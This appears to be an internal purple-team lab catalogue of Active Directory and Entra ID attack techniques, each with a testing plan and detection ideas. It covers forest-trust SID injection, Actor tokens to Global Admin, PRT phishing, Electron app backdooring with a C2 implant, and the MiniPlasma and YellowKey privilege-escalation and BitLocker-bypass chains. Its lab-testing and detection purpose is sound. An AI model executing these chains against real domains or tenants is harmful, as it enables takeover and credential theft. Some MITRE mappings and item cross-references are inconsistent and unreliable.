**Relevance to CADRE:** Phase 7 study reference. CVE-2020-1472 Zerologon originally required 256 brute-force attempts (1 in 256 chance per attempt). Dirk-jan's version uses Netlogon Secure Channel establishment to drop the secret to a known value in 1 attempt, then dump hashes. Safer and faster.

**Why CADRE needs it:** Foundation for understanding the Netlogon Secure Channel. The technique itself is patched on Server 2025, but the method is the basis for CVE-2026-41089 (the standalone exercise we already have). Worth a study reference.

**Campaign location:** Detection engineering reference. Connected to CVE-2026-41089 standalone exercise.

**Testing plan:** Not applicable on Server 2025. Use as reference for Netlogon attack surface.

**Detection:** n/a (won't fire on Server 2025). Use as reference for Netlogon protocol.

---

### 66. Forest Trust SID Filtering Study (Phase 8) ✅

**Source:** https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/
**Year:** 2018
**Tool:** n/a (reference)
**MITRE:** T1485 (Data Destruction - relevant for Golden/Silver Ticket detection)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 8). Read before Phase 8 — critical because SID Filter is OFF on CADRE trust.

**Relevance to CADRE:** Phase 8 (Forest Trust) — foundational reference. CADRE has cadre.local ↔ child.cadre.local with **SID Filter OFF**. This means SID injection across the trust is possible. The blog post explains exactly how SID filtering works (or doesn't).

**Why CADRE needs it:** Critical to understand Phase 8. Without SID filtering, an attacker in child domain can inject SIDs from cadre.local into TGT requests → get DA in parent. This is the Phase 8 attack path we need to test.

**Campaign location:** Phase 8 (Forest Trust) — study reference for SID injection attack. Pairs with CVE-2020-0665 part 2 (trust bypass logic flaw).

**Testing plan:** Read both parts before executing Phase 8. After reading, document the exact attack flow:
1. Compromise child.cadre.local user
2. Forge inter-realm TGT with cadre.local DA SID injected (SID history)
3. Present to child DC for inter-realm referral TGS
4. Use referral TGS to access cadre.local resources as DA

**Detection:** Zeek kerberos.log — flag inter-realm TGT requests with SID history field set. Elastic cadre-* rule for SID injection.

---

### 67. CVE-2020-0665 Forest Trust Bypass Study (Phase 8) ✅

**Source:** https://dirkjanm.io/active-directory-forest-trusts-part-2-trust-bypass/
**Year:** 2021
**Tool:** n/a (reference)
**MITRE:** T1558 (Steal or Forge Kerberos Tickets)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 8). Patched reference; included for threat-modeling completeness.

**Relevance to CADRE:** Phase 8 (Forest Trust) — CVE-2020-0665 is a Microsoft Kerberos implementation bug where the path of trusted forest objects is constructed incorrectly, allowing an attacker to bypass SID filtering via a specially-crafted SPN. Patched in 2020, but the technique is foundational.

**Why CADRE needs it:** Pairs with #49 (SID filtering study) for Phase 8 understanding. Even on patched systems, the technique can be detected by examining SPN routing.

**Campaign location:** Phase 8 (Forest Trust) — study reference. Patched, won't fire on Server 2025.

**Testing plan:** n/a (patched). Use as reference for understanding trust boundaries.

**Detection:** n/a (patched). Use as detection reference for SPN routing.

---

### 68. Azure AD Connect DPAPI Dump (Phase 3.5) ✅

**Source:** https://dirkjanm.io/active-directory-azure-ad-connect-vulnerabilities/
**Year:** 2019
**Tool:** adconnectdump
**MITRE:** T1555 (Credentials from Password Stores)
**Status:** ✅ Adopted into CAMPAIGNS.md Branch 3.5 — 3.5M (Azure AD Connect DPAPI Dump). Cloud Sync agent is on dc01. Full test plan.

**Relevance to CADRE:** Phase 3.5 — if CADRE has Azure AD Connect deployed, the MSOL account credentials are stored using DPAPI. Once SYSTEM is obtained, adconnectdump can extract these credentials and pivot to Entra ID. **CADRE has the Cloud Sync agent on dc01** — this attack applies.

**Why CADRE needs it:** Once we have SYSTEM via GodPotato on mbr01, we can run adconnectdump to extract the cloud sync credentials → use them to authenticate to Entra ID → enumerate cloud environment. This is the bridge to Plan 11.

**Campaign location:** Phase 3.5 (Credential Access) — after SYSTEM obtained. Pairs with Plan 11 (EntraGoat) initial access.

**Testing plan:**
1. `adconnectdump` on dc01 (where Cloud Sync agent runs)
2. Extract MSOL account credentials
3. Use ROADtools to authenticate to Entra ID
4. Enumerate users, groups, applications
5. Look for Global Admin or Application Admin roles

**Detection:** Sysmon EID 1 (adconnectdump.exe execution). File create events on MSOL account credential files. **Sensitive** — Cloud Sync agent access is heavily monitored in real environments.

---

### 69. Actor Tokens → Global Admin (Plan 11) ⏳

**Source:** https://dirkjanm.io/one-token-to-rule-them-all/
**Year:** 2025
**Tool:** Custom PowerShell + Azure CLI
**MITRE:** T1078.004 (Valid Accounts: Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — **MOST IMPACTFUL Entra ID vulnerability ever found**. Actor tokens (token issued by an "Actor" service on behalf of a tenant) can be abused to gain Global Admin in **any Entra ID tenant** that has not explicitly disabled Actor token support. CADRE's EntraGoat environment should test this immediately.

**Why CADRE needs it:** If successful, this gives instant Global Admin in any tenant with default config. Microsoft's response was to allow tenants to disable Actor tokens, but most haven't.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.1 first item to test. Requires EntraGoat environment.

**Testing plan:**
1. Set up EntraGoat lab (separate from CADRE if no Azure subscription)
2. Follow Dirk-jan's PoC steps to request an Actor token
3. Use the token to call Microsoft Graph API
4. Add a new Global Admin user
5. Document the attack chain for detection engineering

**Detection:** Microsoft Defender for Cloud Apps (formerly MCAS) flags unusual Actor token requests. Custom Azure AD audit log query for Actor token issuance. **Most orgs have no detection for this** — it's a brand new attack class.

---

### 70. Cloud Kerberos Trust → Domain Admin (Plan 11) ⏳

**Source:** https://dirkjanm.io/obtaining-domain-admin-from-azure-ad-via-cloud-kerberos-trust/
**Year:** 2023
**Tool:** ROADtools + Impacket
**MITRE:** T1558 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — **CRITICAL for CADRE**. CADRE has the Cloud Sync agent on dc01. If Cloud Kerberos Trust is enabled, an Entra ID attacker can request a Kerberos ticket for a Hybrid Azure AD-joined device → use it to authenticate to on-prem AD as that device → chain to DA.

**Why CADRE needs it:** This is the most direct Azure → on-prem attack path. Cloud Sync makes it accessible. If we can simulate this in EntraGoat, we have a complete hybrid attack story.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.2 second item. Requires Cloud Kerberos Trust enabled.

**Testing plan:**
1. From Entra ID, identify a Hybrid Azure AD-joined device (e.g., dc01$)
2. Use ROADtools to request a Kerberos ticket for the device principal name
3. Use the ticket with Impacket to authenticate to dc01
4. Run secretsdump against dc01 → KRBTGT hash
5. Golden Ticket → full domain

**Detection:** Zeek kerberos.log — flag inter-realm TGS requests from non-DC sources. Elastic Azure AD sign-in log — flag Kerberos ticket requests from untrusted IPs. **CADRE has Zeek + ES already, so this is detectable.**

---

### 71. PRT Phishing (Plan 11) ⏳

**Source:** https://dirkjanm.io/phishing-for-primary-refresh-tokens/
**Year:** 2023
**Tool:** ROADtools + custom phishing page
**MITRE:** T1528 (Steal Application Access Token) + T1078.004 (Valid Accounts: Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Initial access to Entra ID via PRT phishing. PRT is a Primary Refresh Token issued by Azure AD to devices — equivalent to a TGT for cloud. Phishing the PRT gives a persistent, MFA-bypassing token that works until the device object is deleted.

**Why CADRE needs it:** This is the most realistic Plan 11 initial access vector. Real attackers use PRT phishing to bypass MFA entirely. CADRE's EntraGoat should test this end-to-end.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.3 third item. Pairs with Hybrid Phish kit.

**Testing plan:**
1. Set up phishing page that mimics Azure AD device join flow
2. Victim "joins" → PRT issued to attacker-controlled device
3. Use PRT to mint SSO cookies → access Exchange, SharePoint, etc.
4. Enumerate Global Admin roles
5. Document the attack chain

**Detection:** Microsoft Defender for Identity (MDI) flags unusual PRT requests. Azure AD sign-in log — flag PRT requests from non-managed device IPs. Custom Elastic rule: impossible travel + new device PRT issuance.

---

### 72. Intune ADCS ESC1 (Plan 11) ⏳

**Source:** https://dirkjanm.io/extending-ad-cs-attack-surface-to-the-cloud-with-intune-certificates/
**Year:** 2025
**Tool:** certipy + Intune admin
**MITRE:** T1558 (Steal or Forge Kerberos Tickets) + T1078.004 (Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — **CRITICAL HYBRID ATTACK**. Intune can issue ADCS certificates via SCEP. If Intune admin can configure a vulnerable certificate template, the resulting cert can be used for ESC1 attacks against on-prem AD. Bridges cloud admin → on-prem DA.

**Why CADRE needs it:** Intune admin is often a less-protected role than Domain Admin. If we can show that Intune admin → on-prem DA via ADCS ESC1, the impact is huge.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.4 fourth item. Requires Intune + ADCS integration.

**Testing plan:**
1. Set up Intune certificate profile in EntraGoat
2. Configure vulnerable template (e.g., ENROLLEE_SUPPLIES_SUBJECT + client auth EKU)
3. Enroll a "device" → certificate issued with attacker-controlled SAN
4. Use certipy auth to authenticate as DA
5. Document the full chain

**Detection:** Elastic ADCS EID 4886/4887 (certificate issued) with ENROLLEE_SUPPLIES_SUBJECT flag. Intune audit log for SCEP profile creation. **Most orgs don't monitor Intune certificate issuance.**

---

### 73. Temporary Access Pass Lateral Movement (Plan 11) ⏳

**Source:** https://dirkjanm.io/lateral-movement-with-temporary-access-passes/
**Year:** 2024
**Tool:** ROADtools + Impacket
**MITRE:** T1556 (Modify Authentication Process) + T1078.004
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Temporary Access Passes (TAPs) are time-limited passcodes used for passwordless onboarding. Once obtained, they can be used to authenticate to Entra ID, mint a PRT, and pivot to on-prem if the user is hybrid-joined. CADRE has hybrid users (analyst_cloud, analyst_t1, etc.) — this attack applies.

**Why CADRE needs it:** TAPs are increasingly popular for reducing MFA fatigue. If an attacker can intercept a TAP (e.g., via email or SMS), they can bypass MFA entirely.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.5 fifth item. Pairs with PRT Phishing (#54).

**Testing plan:**
1. In EntraGoat, create a TAP for a test user
2. Use ROADtools to redeem the TAP → PRT issued
3. Use PRT to access Exchange Online → extract sensitive email
4. If user is hybrid, use PRT to access on-prem via Cloud Kerberos Trust
5. Document attack chain

**Detection:** Azure AD audit log — flag TAP issuance followed by immediate authentication. Defender for Cloud Apps — flag unusual TAP redemption patterns. **CADRE can detect this with Azure AD sign-in log queries.**

---

### 74. Federated Credentials Persistence (Plan 11) ⏳

**Source:** https://dirkjanm.io/persisting-on-entra-id-apps-with-federated-credentials/
**Year:** 2024
**Tool:** Azure CLI / PowerShell
**MITRE:** T1136.003 (Create Account: Cloud Account) + T1078.004
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Federated credentials on Entra ID apps enable long-term persistence. Once added, an attacker can mint tokens for the app indefinitely (no password rotation needed). Also affects User Managed Identities.

**Why CADRE needs it:** This is a **stealthy persistence mechanism** that bypasses traditional credential rotation. If we can show the persistence potential, we have a strong detection engineering story.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.6 sixth item. Persistence phase of EntraGoat.

**Testing plan:**
1. Compromise an Entra ID app via Application Admin role
2. Add a federated credential (e.g., GitHub Actions OIDC)
3. Use GitHub Actions workflow to mint tokens for the app
4. App tokens have whatever permissions the app has (potentially Graph API)
5. Use the tokens to enumerate users, send mail, etc.
6. Document the persistence

**Detection:** Azure AD audit log — flag federated credential addition. Microsoft Defender for Cloud Apps — flag app token requests from unusual sources. **CADRE has ES + Azure AD integration potential.**

---

### 75. Abusing Application Admin → Global Admin (Plan 11) ⏳

**Source:** https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/
**Year:** 2019
**Tool:** Azure CLI / MSOnline PowerShell
**MITRE:** T1078.004 (Valid Accounts: Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Application Admin role in Entra ID can add credentials to default Office 365 applications (Microsoft Graph, etc.). Once credentials are added, the attacker can authenticate as the app → escalate to Global Admin. **Still unpatched in 2026** — Microsoft considers it "by-design."

**Why CADRE needs it:** This is a long-standing privilege escalation path that most Entra ID tenants are vulnerable to. Detection engineering for this is critical.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.7 seventh item.

**Testing plan:**
1. In EntraGoat, obtain Application Admin role
2. Add a client secret to Microsoft Graph service principal
3. Authenticate as the app via OAuth2 client credentials flow
4. Call Graph API with app permissions → enumerate users
5. Look for Global Admin role assignments
6. Document the attack chain

**Detection:** Azure AD audit log — flag credential addition to default apps. MSOnline PowerShell module — flag unusual app credential creation. **CADRE has Azure AD audit log integration potential via ES.**

---

### 59. Electron App Backdooring (Loki C2) — Phase 3 Defense Evasion ✅

**Source:** https://whiteknightlabs.com/2026/01/20/backdooring-electron-applications/
**Tool:** Loki C2 (https://github.com/boku7/Loki)
**MITRE:** T1218 (System Binary Proxy Execution) + T1036 (Masquerading)
**Status:** ⏳ Pending — Phase 3 defense evasion

**Relevance to CADRE:** Replace `resources/app` JS code in signed Electron apps (Teams, Discord, Mailspring) with C2 implant. App is signed → bypasses WDAC, AppLocker, and most EDR. C2 via Azure Blob Storage (`*.blob.core.windows.net`) — legitimate Azure domain blends with normal traffic.

**Why CADRE needs it:**
- Bypasses application control (WDAC, AppLocker) — signed app execution
- C2 over legitimate Azure domains — bypasses network filtering
- Works against MDE and other EDRs without obfuscation in many cases
- Mailspring is vulnerable to this technique (open source Electron app)

**Campaign location:** Phase 3 (Execution) — defense evasion. Variant of existing supply-chain exercises (F-01 to F-13).

**Testing plan:**
1. Install Mailspring on mbr01
2. Download Loki C2 server on Kali
3. Generate implant with Azure Blob SAS token
4. Replace `resources/app` in Mailspring with implant
5. Run on mbr01 → verify C2 connection established
6. Verify detection: Sysmon EID 11 (file create in `resources\app\`), process creation from Electron app

**Detection:**
- Sysmon EID 11: file creation in `resources\app\` outside update cycle
- Suricata SID:1000080: TLS to `*.blob.core.windows.net` from non-browser process
- Elastic: process creation from signed Electron app spawning cmd/powershell
- File integrity: hash change in `resources\app\` folder

---

## Tier 3 Summary

| # | Item | Phase | Year | Status |
|---|------|-------|------|--------|
| 60 | ADIDNSDump | Phase 0 | 2019 | ⏳ |
| 61 | RBCD + NTLM Relay | Phase 6 | 2019 | ⏳ |
| 62 | Unconstrained Delegation (krbrelayx) | Phase 6 | 2019 | ⏳ |
| 63 | NTLM Relay to ADCS (ESC8) | Branch B | 2021 | ⏳ |
| 64 | SMB-to-LDAP Relay (CVE-2019-1040) | Phase 6 | 2019 | ⏳ |
| 65 | Zerologon Alternative | Phase 7 | 2020 | ⏳ |
| 66 | Forest Trust SID Filtering | Phase 8 | 2018 | ✅ |
| 67 | CVE-2020-0665 Trust Bypass | Phase 8 | 2021 | ✅ |
| 68 | Azure AD Connect DPAPI Dump | Phase 3.5 | 2019 | ✅ |
| 69 | Actor Tokens → Global Admin | Plan 11 | 2025 | ⏳ |
| 70 | Cloud Kerberos Trust → DA | Plan 11 | 2023 | ⏳ |
| 71 | PRT Phishing | Plan 11 | 2023 | ⏳ |
| 72 | Intune ADCS ESC1 | Plan 11 | 2025 | ⏳ |
| 73 | Temporary Access Pass Lateral | Plan 11 | 2024 | ⏳ |
| 74 | Federated Credentials Persistence | Plan 11 | 2024 | ⏳ |
| 75 | Application Admin → GA | Plan 11 | 2019 | ⏳ |
| 76 | Onelogon Zero-Channel (single-channel NRPC bypass) | Phase 5 → 7 | 2026 | ⏳ |
| 77 | Onelogon AES-CBC8 Downgrade (KRBTGT hash extraction) | Phase 3.5 → 7 | 2026 | ⏳ |
| 90 | NetExec (nxc) — CrackMapExec replacement | Phases 0-5 | 2026 | 🆕 |
| 91 | bloodyAD v2.5.4 — Linux PowerView replacement | Phase 2/3.5/5 | 2026 | ✅ |
| 92 | Certipy v5.1.0 — Modern ADCS framework | Branch B | 2026 | ✅ |
| 93 | DonPAPI v2.0+ — Remote DPAPI harvesting | Phase 3.5 | 2026 | 🆕 |
| 94 | lsassy v3.1.16 — Remote LSASS dump (15+ methods) | Phase 3.5 | 2026 | 🆕 |
| 95 | KrbRelay + KrbRelayUp — LPE via Kerberos relay | Branch 3.5 | 2026 | 🆕 |
| 96 | BARK (BloodHound Attack Research Kit) — Azure/Entra only | Plan 11 | 2026 | ⏳ |
| 97 | Skipjack — PAC signature downgrade (cross-forest trust) | Phase 8 alt | 2026 | ⏳ |
| 98 | NetExec `coerce_plus` + 5 new modules + `--kdcHost` flag | Phase 0/3.5/5 | 2026 | 🆕 |
| 99 | ADeleg — GUI tool for ACL/ADCS recon | Phase 0 + Branch A + Branch B | 2026 | 🆕 |
| 100 | Windows Security Internals — Kerberos/AD internals | Phase 1/2/5/6/7/8 (study ref) | 2026 | ⏳ |
| 101 | Practical Purple Teaming — lab + DFIR | DFIR + plan1.7 (study ref) | 2026 | ⏳ |
| 102 | dsHeuristics abuse (forest-level AD behavior) | Phase 0/1 (Recon) | 2026 | 🆕 |
| 103 | UAC bit exploitation beyond DONT_REQ_PREAUTH | Phase 0/1/5 (Recon) | 2026 | 🆕 |
| 104 | ms-DS-Machine-Account-Quota check | Phase 5 (RBCD pre-flight) | 2026 | 🆕 |
| 105 | SACL/audit policy manipulation for detection evasion | Phase 5+ (Defense Evasion) | 2026 | 🆕 |
| 106 | Atomic Red Team as validation framework | Cross-cutting (validation) | 2026 | 🆕 |
| 107 | GitHub Actions Supply-Chain Attack Patterns | Plan 0.8 + Track H | 2026 | ⏳ |
| 59 | Electron App Backdooring (Loki C2) | Phase 3 | 2026 | ✅ |

**16 new items added (Items 60-75, Dirk-jan blog)**. **Plus Item 59** (Electron backdooring). **Plus Items 76-77** (Onelogon WOOT 2026, fills #76-77 gap). **Plus Items 90-96** (7 modern AD tool updates, 2026-06-24). **Plus Items 97-107** (Skipjack, Onelogon detect ref, NetExec additions, CVE-2026-41089, ADeleg, books #100-101, 5 extracted techniques #102-106, GitHub Actions supply-chain #107). **Total Tier 3: 32.**

---

## Cross-Reference Index

This is the running index of all items by source. Updated as items are added.

| # | Item | Source |
|---|------|--------|
| 1-12 | Tier 1: MSSQLHound, MSSQL/SCCM CVEs, Nemesis DPAPI, ctfmon, Certified Pre-Owned, Shai-Hulud, Ludus SCCM, WMI, Invisible Tasks, Golden/Silver, Device Code | SpecterOps (2026) + dbgman |
| 13-16 | Tier 2: ghostsurf, Shift Happens, NTLMv1 Rainbow, Skip Turnstile | SpecterOps (2026) |
| 17-18 | Tier 3 reference: Red Team philosophy, IdP attack paths | SpecterOps methodology |
| 19-28 | iPurple additions: ADWS, WerFault, Cross-Session, SharpHound Detection, BadSuccessor, WinGet, EntryPoint, SpeechRuntime, GAC Hijacking, Credential Guard | iPurple.team (2024-2026) |
| 29-33 | SpecterOps 2025 additions: UnPAC-the-Hash, ETW Internals, MSSQL 2025 AI, DCOMIllusionist, CVE-2026-41089 Netlogon | SpecterOps + Synacktiv + CERT-EU |
| 34-42 | RTO course techniques: DLL Hijack, COM Hijack, IFEO, LSA SSP, UACME, Named Pipe, Handle Leak, Token Dance, LAPS | Zero Point Security (2025) |
| 43-47 | Altered Security additions: BetterSuccessor, RBCD, Pass-the-Cert, DCSync Detection, Logon Types | Altered Security (2025) |
| 59 | Electron App Backdooring (Loki C2) | White Knight Labs (2026) |
| **60-75** | **Dirk-jan blog (ADCS, Forest Trust, Azure, PRT, etc.) — renumbered from 43-58 in 2026-06-23 audit** | **dirkjanm.io (2018-2025)** |
| **78-80** | **MiniPlasma, GreenPlasma, YellowKey (Win EoP / BitLocker bypass)** | **Project NightCrawler (NightmareEclipse, 2026-06-18)** |
| **81-82** | **UnCanny Coerce (NTLM coercion via InstallService) + UnCanny LPE (SYSTEM via InstallService)** | **0xHossam (2026-06-19)** |
| 83 | IPv4-mapped IPv6 Phishing URL Parser Bypass | SANS ISC (Xavier Mertens, 2026-06-19) |
| **84-89** | **KDS Root Key Attacks — Golden gMSA/dMSA, DSRM, LAPS bulk, DPAPI-NG SID Protector** | **Grafnetter TROOPERS26 (2026-06-20)** |
| **76-77** | **Onelogon — single-channel NRPC bypass (Zero-Channel + AES-CBC8 downgrade)** | **Pădurean WOOT 2026 (2026-06-24)** |
| **90-96** | **Modern AD attack tools: NetExec, bloodyAD, Certipy, DonPAPI, lsassy, KrbRelay/KrbRelayUp, BARK** | **Multiple authors (2026-06-24 landscape research)** |
| **33 (PoC)** | **CVE-2026-41089 Netlogon CLDAP stack buffer overflow (PoC)** | **0xABCD01 GitHub PoC (2026-06-24 clone)** |
| **97** | **Skipjack — cross-forest trust downgrade via invalid PAC signature** | **GhostWolfLab (2026-06-23 blog post)** |
| **98** | **NetExec `coerce_plus` + 5 new modules (`pre2k`, `enum_av`, `get-desc-users`, `winscp`, `rdp`) + `--kdcHost` flag** | **Hacking Articles AI+HexStrike analysis (2026-06-24)** |
| **99** | **ADeleg — Windows GUI tool for ACL/ADCS recon (Phase 0 + Branch A + Branch B)** | **ADeleg podcast Episode 173 + course material (2026-06-24)** |
| **100** | **Windows Security Internals — Kerberos/AD internals reference (Phase 1/2/5/6/7/8)** | **James Forshaw, NoStarchPress 2023 (`CADRE-Courses/NoStarchPress_extract/WindowsSecurityInternals_11172023/`)** |
| **101** | **Practical Purple Teaming — lab + DFIR reference (DFIR + plan1.7)** | **Chase Petrey, NoStarchPress (`CADRE-Courses/NoStarchPress_extract/Practical_Purple_Teaming-0642572230173/`)** |
| **102-106** | **5 concrete techniques extracted from reference books** | **Same sources as #100-101** |
| **107** | **GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails)** | **GMO Flatt Security blog Part 1 (Sato, 2026-06-24)** |

**Numbering notes:**
- #9 missing (Tier 1 skipped during original write — see Tier 1 between #8 WMI and #10 Invisible Tasks)
- #76-77 now USED (Onelogon Zero-Channel + AES-CBC8 Downgrade, 2026-06-24)
- Items #60-75 were originally numbered #43-58 when first added (Dirk-jan section). They collided with the Altered Security items at the same numbers. Renumbered to #60-75 in 2026-06-23 audit.

---

## Project NightCrawler — Windows Vulnerability PoCs (2026-06-18)

**Source:** https://git.projectnightcrawler.dev/explore/repos (Gitea, NightmareEclipse / "Church of Malware")
**Cloned:** `references/project-nightcrawler/` (source-only, exploit binaries removed)
**Analysis:** `docs/internal/references/project-nightcrawler-analysis.md`
**Total:** 8 unique repos, ~45.7 MiB. Multi-account mirrors (hxcker-263, Clozof, andsilvaf2024, recar) all forks of NightmareEclipse originals.

**CADRE relevance summary:**
| Repo | Server 2025? | CADRE Impact |
|------|--------------|--------------|
| **MiniPlasma** | ✅ All Windows | **HIGH** — Standard user → SYSTEM via CVE-2020-17103 race |
| **GreenPlasma** | ✅ Server 2026 (=2025) | **HIGH** — CTFMON arbitrary section creation (partial PoC) |
| **YellowKey** | ✅ Server 2022/2025 | **MEDIUM** — BitLocker bypass (physical access class) |
| UnDefend | Any | LOW — Defender already disabled on CADRE |
| RoguePlanet | Claimed, PoC fails on Server | LOW — std user can't mount ISO on Server |
| GreatXML | Not specified | LOW — desktop only |
| RedSun | Not specified | LOW — Defender-specific |
| BlueHammer | Not specified, bugs noted | LOW — research grade |

### 78. MiniPlasma — CVE-2020-17103 Unpatched → SYSTEM 🔬

**Repo:** `references/project-nightcrawler/MiniPlasma/`
**Source file:** `PoC_AbortHydration_ArbitraryRegKey_EoP/Program.cs` (369 lines C#)
**Vulnerability:** `cldflt!HsmOsBlockPlaceholderAccess` race condition. Originally reported by James Forshaw (Google Project Zero) as CVE-2020-17103 — claimed fixed but the patch appears rolled back or never landed. All Windows versions affected.

**Exploit chain (4 stages):**

| Stage | Action |
|-------|--------|
| 0 | Spawns stages 1, 2, 3 as child processes |
| 1 | Registry NotifyChange watcher + anon-token flipper thread + tight `CfAbortOperation(pid, 0, Block)` loop (race trigger) |
| 2 | Open `HKCU\Software\Policies\Microsoft\CloudFiles` (WriteDac+WriteOwner) → apply SD giving Everyone + Anonymous GENERIC_ALL → delete `BlockedApps` tree → create symbolic link `BlockedApps` → `\Registry\User\.DEFAULT\Volatile Environment` → re-trigger race under symlink |
| 3 | Cleanup symlink → set `HKU\.DEFAULT\Volatile Environment\windir` = `<attacker_dir>` → copy self to `<attacker_dir>\System32\wermgr.exe` → trigger WER `QueueReporting` task (runs wermgr.exe AS SYSTEM) → SYSTEM wermgr connects to `MiniPlasmaWERPipe` named pipe → duplicated token → `Win32Process.CreateProcessAsUser(conhost.exe)` |

**Key insight:** Does NOT require SeImpersonatePrivilege, SeDebugPrivilege, or any admin token. Privilege escalation comes from abusing **Windows Error Reporting's auto-start of `wermgr.exe`** from the `windir` environment variable — which the symlink lets us control.

**CADRE relevance:** All 5 Windows VMs run Server 2025 — all vulnerable. `cldapi.dll::CfAbortOperation` is the trigger and is exported only by cldapi.dll. **Test target: mbr01 first** (non-DC, snapshot before testing — DC01 destabilization could break AD).

**Detection surface (cadre-e* candidates):**
- `logs-endpoint.events.process-*`: cldapi.dll loaded by non-system process
- `logs-endpoint.events.process-*`: schtasks trigger of `\Microsoft\Windows\Windows Error Reporting\QueueReporting` by non-system
- `logs-endpoint.events.registry-*`: `HKCU\Software\Policies\Microsoft\CloudFiles` modifications + `BlockedApps` symlink creation
- `logs-endpoint.events.registry-*`: `HKU\.DEFAULT\Volatile Environment\windir` set to non-`C:\Windows` value
- `logs-endpoint.events.pipe-*`: Named pipe `MiniPlasmaWERPipe` creation
- `logs-endpoint.events.file-*`: wermgr.exe replacement in non-standard location
- ETW provider `Microsoft-Windows-CldFlt` (very rare, high signal)
- ETW provider `Microsoft-Windows-Kernel-General` Event 16 (object manager symlinks)

**MITRE ATT&CK:** T1068 Exploitation for Privilege Escalation, T1543 Create or Modify System Process, T1547 Boot or Logon Autostart Execution, T1569 System Services
**Status:** 🔬 Research only. Do NOT execute on CADRE without snapshot + mbr01-only testing first.

### 79. GreenPlasma — CTFMON Arbitrary Section → EoP 🔬

**Repo:** `references/project-nightcrawler/GreenPlasma/`
**Source file:** `GreenPlasma.cpp` (244 lines C++)
**Vulnerability:** CTFMON arbitrary memory section creation in any directory writable by SYSTEM. Affects Win 11/2022/2026 (=2025).

**Exploit chain:**

| Step | Action |
|------|--------|
| 1 | `CfAbortOperation(pid, 0, Block)` race trigger |
| 2 | `TreeSetNamedSecurityInfo(CloudFiles, ...)` — grant Everyone GENERIC_ALL via DACL reset |
| 3 | `RegDeleteTree(CloudFiles\BlockedApps)` + recreate as symlink to `HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\Policies\System` |
| 4 | Re-trigger race under symlink → now-controllable DACL on `Policies\System` |
| 5 | Set `DisableLockWorkstation = 1` |
| 6 | `NtCreateSymbolicLinkObject(\Sessions\N\BaseNamedObjects\CTF.AsmListCache.FMPWinlogonN → \BaseNamedObjects\CTFMON_DEAD)` |
| 7 | `ShellExecuteEx("runas", conhost.exe)` — UAC elevation prompt |
| 8 | Tight `NtOpenSection` loop on CTFMON object until winlogon opens it |
| 9 | `OpenInputDesktop()` loop + `LockWorkStation()` |

**Why CADRE cares:** CTFMON runs by default on Server 2025. The session-tagged `CTF.AsmListCache.FMPWinlogon{N}` object is internal CTFMON state — its hijack affects every interactive session. PoC is **partial** — the SYSTEM-shell conversion is left as CTF challenge (need to combine with symbolic link abuse → service DLL hijack pattern).

**Detection surface:**
- `logs-endpoint.events.registry-*`: `DisableLockWorkstation = 1` set in `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System` by non-admin
- `logs-endpoint.events.process-*`: `C:\Windows\System32\conhost.exe` spawned via `ShellExecuteEx runas` from non-elevated parent
- ETW `Microsoft-Windows-Kernel-General` Event 16 (object manager symlinks in `\Sessions\*\BaseNamedObjects\`)
- `CfAbortOperation` calls (same as MiniPlasma)

**MITRE ATT&CK:** T1068 Exploitation for Privilege Escalation
**Status:** 🔬 Research only. PoC is partial — would need to chain with another primitive for full SYSTEM shell. See James Forshaw's symbolic-link-to-system research for the conversion.

### 80. YellowKey — BitLocker Bypass via FsTx + WinRE 🔬

**Repo:** `references/project-nightcrawler/YellowKey/`
**Source file:** FsTx log files (~21 MiB NTFS transaction artifacts), no source code (the exploit is the file structure + key sequence)
**Vulnerability:** BitLocker bypass via FsTx (File System Transaction) log files planted in `System Volume Information\FsTx`. Triggered by WinRE restart while holding CTRL. Affects Win 11 + Server 2022/2025.

**Reproduction steps:**
1. Copy `FsTx/{guid}/...` from repo to `X:\System Volume Information\FsTx` (USB stick or even EFI partition)
2. Plug into target (or pull disk → modify EFI → return)
3. SHIFT+Click Restart (enters WinRE)
4. Hold CTRL during restart
5. Shell spawns with unrestricted BitLocker volume access

**Author's note:** "Almost feels like backdoor." The vulnerable FsTx handler is the same binary as desktop version, but with the FsTx triggering functionality **stripped on desktop**. Only Win 11 + Server 2022/2025 affected — Win 10 not affected.

**CADRE relevance:** Different threat class — requires **physical/disk access + reboot + key sequence**. Out of scope for online credential campaign. Useful as:
- Threat model reference (BitLocker ≠ full disk encryption if attacker has disk access + WinRE)
- Possibly testable by detaching VMDK from mbr01, mounting on host, copying FsTx, reattaching, booting into WinRE via VBox/VMware boot menu, holding CTRL during restart. **Significant engineering effort.**
- Demonstrates "evil maid" threat class separation from credential/domain compromise

**MITRE ATT&CK:** T1490 Inhibit System Recovery
**Status:** 🔬 Research only. Not proposed for online campaign. Treat as separate threat-modeling exercise.

---

## 0xHossam — UnCanny Coerce + LPE 0day (2026-06-19)

**Source:** https://github.com/0xHossam/UnCanny
**Cloned to:** `references/uncanny/UnCanny/` (1.1 MiB, source only — `lpe/lpe.c`, `lpe/plugin.c`, `poc/AppxManifest.xml`, `poc/Invoke-InstallServiceCoerce.ps1`, `poc/setup.sh`)
